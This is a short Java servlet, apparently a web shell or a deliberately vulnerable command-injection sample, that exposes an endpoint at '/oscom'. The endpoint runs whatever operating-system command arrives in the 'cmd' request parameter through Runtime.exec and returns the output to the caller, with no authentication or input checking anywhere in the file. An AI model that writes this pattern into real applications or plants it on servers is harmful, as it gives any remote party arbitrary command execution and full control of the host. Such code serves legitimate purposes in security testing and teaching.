import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;

@WebServlet(urlPatterns = {"/oscom"})
public class oscom extends HttpServlet {

    @Override
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException {

        PrintWriter responseWriter = response.getWriter();

        String cmd = request.getParameter("cmd");

        if (cmd == null || "".equals(cmd)) {
            responseWriter.print("error");
            return;
        }

        try {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(cmd);

            BufferedReader stdInput = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String s = null;
            while ((s = stdInput.readLine()) != null) {
                responseWriter.println(s);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}